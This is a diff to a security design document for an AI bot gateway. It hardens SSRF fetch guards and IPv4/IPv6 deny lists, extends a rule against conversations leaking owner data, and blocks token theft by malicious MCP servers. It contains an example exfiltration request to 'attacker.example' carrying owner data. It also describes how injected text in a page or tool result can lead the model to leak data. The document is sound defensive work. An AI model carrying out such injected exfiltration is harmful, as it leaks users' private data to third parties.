@@ -193,10 +193,15 @@ TinyCloud trust boundary to the provider, and the owner copy must say so.
 **Fetch guards.** Every fetch, and every redirect hop, goes through one guard:
 - Scheme `https` or `http` only; no user info in the URL; ports 80 and 443 only; no non-HTTP schemes of any kind.
 - The host is resolved by the gateway and **every** address returned is checked; the connection is then made to the
-  address that was checked (not resolved again), with the original host in SNI and `Host`. That closes DNS rebinding.
+  address that was checked (not resolved again), with the original host in SNI and `Host`. That closes DNS rebinding
+  only if nothing in between resolves the name again: the fetcher ignores `HTTP_PROXY`, `HTTPS_PROXY` and `NO_PROXY`
+  and talks to the target directly. A proxy placed behind the gateway would resolve the name itself and reopen
+  rebinding, unless its own dial-time deny list carries the same list as below.
 - Refused addresses: loopback, unspecified, private (RFC 1918), shared/CGNAT, link-local (including the cloud metadata
-  address `169.254.169.254`), multicast, broadcast, reserved, IPv6 loopback/ULA/link-local, and IPv4-mapped or
-  NAT64 forms of any of these. IP literals in decimal, octal or hex form are normalised before the check. Names that
+  address `169.254.169.254`), multicast, broadcast, reserved, IPv6 loopback/ULA/link-local, and these forms, named
+  explicitly because they embed or tunnel IPv4 addresses: IPv4-mapped `::ffff:0:0/96`, IPv4-compatible `::a.b.c.d`
+  (`::/96`), NAT64 `64:ff9b::/96` and the local-use `64:ff9b:1::/48`, 6to4 `2002::/16`, Teredo `2001::/32` and
+  site-local `fec0::/10`. IP literals in decimal, octal or hex form are normalised before the check. Names that
   resolve into the gateway's own compose network are refused by the same rule.
 - At most 3 redirects, each re-checked from the start (scheme, host, address); a redirect to a refused target ends the
   fetch.
@@ -228,16 +233,20 @@ instructions, and the design does not rely on the model to tell the difference:
   expiry. Writes are not exposed in phase 1; a later write phase confirms each write with the owner outside the model.
 - **The exfil rule: the largest risk in phase 2, and one no proxy can remove.** Once Main can read owner data and also
   fetch the open web or call an owner-added server, injected text in a page or a tool result can make it read data and
-  then request `https://attacker.example/?d=<data>`. A search query is the same channel. An allowlist cannot stop this
-  while fetch is open-ended. Phase 2 therefore ships with exactly one of these rules, chosen in decision 5:
-  - **(a) Strict.** In a task that has used owner data (any grant-bearing call), no open fetch and no owner-added server
-    calls. Recommended starting point.
+  then request `https://attacker.example/?d=<data>`, or put the data in an owner-added server's tool arguments (the same
+  channel, to a third party). A search query is the same channel. An allowlist cannot stop this while fetch is
+  open-ended. **The rule is about the conversation, not the task:** owner data stays in Main's context after the task
+  that read it ends, so a later task with no grant-bearing call still holds it. The gateway therefore marks a bot's
+  conversation as holding owner data from the first grant-bearing result, and clears the mark only when the supervisor
+  tells it the conversation was reset with a fresh context (the gateway cannot see what a summary kept, so a summary
+  does not clear it). While marked, exactly one of these rules applies, chosen in decision 5, to `web__fetch`,
+  `web__search` and every owner-added server's tools:
+  - **(a) Strict.** No open fetch and no owner-added server calls. Recommended starting point.
   - **(b) Narrowed.** Fetch only through a gateway-built search call whose query is shown to the owner or length-capped
-    (200 characters), plus URLs the owner typed or a search in the same task returned. This narrows the channel and does
-    not close it: a query or a path can still carry a few words.
-  - **(c) Owner confirms each new domain** (outside the model) before the first fetch to it in a task that has used
-    owner data. The first loosening to consider after (a).
-  The same rule covers owner-added servers: they are arbitrary hosts too.
+    (200 characters), plus URLs the owner typed or a search in the same conversation returned. Owner-added server calls
+    are blocked. This narrows the channel and does not close it: a query or a path can still carry a few words.
+  - **(c) Owner confirms** (outside the model) each new domain before the first fetch to it, and each owner-added
+    server before its first call, while marked. The first loosening to consider after (a).
 
 ## Owner-added MCP servers (phase 3)
 
@@ -257,11 +266,19 @@ tools by name and description.
 3. how long: "Just for this task" (up to 1 hour) or "For 7 days", with the same warning screen before 7 days as for
    TinyCloud data, and no silent renewal.
 
-**Credential.** If the server supports the MCP authorization flow (OAuth with PKCE), the owner signs in at the server in
-their browser and the gateway does the code exchange, as in section 2. If it takes a bearer key instead, the owner pastes
-it once into a field that posts it to the supervisor and on to the gateway; the browser, backend and supervisor do not
-keep it. The gateway holds it as in section 2 (memory for one task; encrypted on its volume for 7 days). The token endpoint
-and every URL the gateway fetches for the flow go through the same guard.
+**Credential.** If the server supports the MCP authorization flow (OAuth with PKCE), the owner signs in at the server's
+authorization server in their browser and the gateway does the code exchange, as in section 2. The server itself names
+its authorization server during discovery, so a malicious server could name a real one (GitHub, Google), the owner
+would approve at a screen they trust, and the gateway would then hand that token to the malicious server. So:
+- The add screen shows the authorization server's host next to the server's, and requires an explicit confirmation when
+  they are different sites ("This server asks you to sign in at <host>").
+- The authorization request carries the RFC 8707 `resource` parameter set to the server's exact URL, and the gateway
+  attaches a token only to the resource it was issued for, never to another server or path.
+- The `state` is bound to the owner and the bot, as in section 2.
+If it takes a bearer key instead, the owner pastes it once into a field that posts it to the supervisor and on to the
+gateway; the browser, backend and supervisor do not keep it, and request-body logging is off for that route in the
+backend and the supervisor. The gateway holds it as in section 2 (memory for one task; encrypted on its volume for 7
+days). The token endpoint and every URL the gateway fetches for the flow go through the same guard.
 
 **Per-server tool allowlist and pinning.** Tools are exposed as `<slug>__<tool>`. The gateway hashes each approved
 tool's name, description and input schema at approval. If the server later changes one, that tool is withheld until the
@@ -321,7 +338,7 @@ argument conditions, and filters `tools/list` responses, including per SSE event
 | --- | --- | --- |
 | Default-deny egress | `allowlist` by domain glob or CIDR; unmatched gets 403 | Good for fixed destinations (model, TinyCloud MCP, search provider). For "fetch any public page" the allowlist has to be wide open, so the deny list does the work. |
 | Built-in DNS | Resolves every name to the proxy so traffic is steered through it | Not used in the sandbox (it has no network). The gateway would use the proxy's HTTP/CONNECT listener instead. Whether the DNS server can be switched off is unchecked. |
-| Upstream IP deny list | `upstream_deny_cidrs`, enforced in the dialer's `Control` hook after resolution (source: `internal/dnsguard`), so a name that resolves or rebinds to a denied address is refused before the connect; IPv4-mapped IPv6 is unmapped first | Good, and it is the piece we would otherwise write ourselves. **The default list is only cloud metadata and loopback.** For open fetch we list: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10` (CGNAT, which includes the operators' private overlay network), `169.254.0.0/16`, `0.0.0.0/8`, `fc00::/7`, `fe80::/10`, multicast, and the NAT64 range. The gateway does not follow redirects, or re-checks every hop through the proxy. With an upstream proxy configured the check applies to the proxy's address, not the target. |
+| Upstream IP deny list | `upstream_deny_cidrs`, enforced in the dialer's `Control` hook after resolution (source: `internal/dnsguard`), so a name that resolves or rebinds to a denied address is refused before the connect; IPv4-mapped IPv6 is unmapped first | Good, and it is the piece we would otherwise write ourselves. **The default list is only cloud metadata and loopback.** Any proxy behind the gateway resolves the name again, so its list must carry the same ranges as the fetch guard (Web access): `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10` (CGNAT, which includes the operators' private overlay network), `169.254.0.0/16`, `0.0.0.0/8`, `fc00::/7`, `fe80::/10`, `fec0::/10`, multicast, and the embedded-IPv4 forms (`::/96`, `64:ff9b::/96`, `64:ff9b:1::/48`, `2002::/16`, `2001::/32`). The gateway does not follow redirects, or re-checks every hop through the proxy. With an upstream proxy configured the check applies to the proxy's address, not the target. |
 | Proxy tokens swapped for real secrets | `secrets` transform: the workload sends a token, the proxy replaces it from env, file, AWS, Vault or 1Password sources, `require: true` rejects requests without it | Fits static service keys (the model key, a search key). Does not fit per-owner, short-lived tokens: sources are static, and a changed value needs a config reload (`POST /v1/reload`) or a `grpc` transform we would write. The gateway keeps per-owner grants itself (section 2). |
 | Per-request audit | JSON per request with the transform trace, secrets swapped (names and locations, not values) and rejections. No headers or bodies, and no query string in a trial run | Mixed. **Paths are logged**, and for web fetch the path is the owner's task content, so raw lines are not shipped as they are: log host only or hash the path (a filter in front of the log, or a patch), and add rotation, since there is none. It is per request, not per owner: it cannot know which bot made a call. |
 | SSE / streamable HTTP | SSE is flushed per chunk, so MCP streamable HTTP over SSE works; WebSocket is HTTP/1 only | Good for MCP and model streaming. Non-SSE chunked responses (NDJSON, Connect, gRPC) are buffered until they end (an open issue, seen in a trial), and the 30 s response-header timeout needs raising for slow tool calls. |
@@ -476,11 +493,14 @@ ships behind the existing test-account flag and does not change the others.
    say so before build.
 4. **Search provider and its key** (a paid credential, so not added without an explicit decision): which of Tavily,
    Brave, Exa, Kagi or self-hosted SearXNG, and a dedicated key for the bots service.
-5. **The exfil rule for phase 2 (pick one).** In a task that has used owner data: (a) no open fetch and no owner-added
-   server calls (recommended start); (b) fetch only through a gateway-built search call with the query shown or capped
-   at 200 characters, plus owner-typed and search-returned URLs; or (c) the owner confirms each new domain. Without
-   one of these, phase 2 is an exfiltration path whatever the egress layer does. See Web access.
-6. **Web access has no expiry** (it carries no owner authority). Say so if it should expire like the data grants.
+5. **The exfil rule for phase 2 (pick one).** It applies to any conversation whose context holds owner data (not just
+   the task that read it) and to web fetch, web search and every owner-added server's tool arguments: (a) no open fetch
+   and no owner-added server calls (recommended start); (b) fetch only through a gateway-built search call with the
+   query shown or capped at 200 characters, plus owner-typed and search-returned URLs, and owner-added server calls
+   blocked; or (c) the owner confirms each new domain and each owner-added server. Without one of these, phase 2 is an
+   exfiltration path whatever the egress layer does. See Web access.
+6. **Web access has no expiry** (it carries no owner authority). With the exfil rule above in place, "until I turn it
+   off" is acceptable; say so if it should expire like the data grants.
 7. **Egress layer.** The plan's recommendation: no iron-proxy for phases 1 and 2; for phase 3 a dedicated dial-out hop
    (Smokescreen preferred, iron-proxy the alternative) chosen after a spike. Or build the guard in the gateway only.
    Whichever, the gateway keeps its own checks and the per-owner tokens.
@@ -502,5 +522,11 @@ On a flagged test account:
   `https://<test host>/?d=<value>`, the chosen exfil rule holds: the test host receives no request carrying the value.
 - **Owner-added server** (a local test server): the tool list shows; an unselected tool is refused; changing a tool's
   description withholds it; Remove ends the next call.
+- **Owner-added server, more:** a server whose discovery names an authorization server on another site makes the add
+  screen show that host and require confirmation, the authorization request carries `resource` set to the server's exact
+  URL, and the token is refused on any other server or path. Paste a bearer key and then grep the backend and
+  supervisor logs for it: it must not appear.
+- **Conversation taint:** after a TinyCloud read, finish the task and start another with no grant-bearing call; the
+  chosen exfil rule still applies to fetch, search and owner-added server calls until the conversation is reset.
 - **Everywhere:** the sandbox's environment, filesystem and a captured request contain no token or key. Report a mock run
   as a mock.
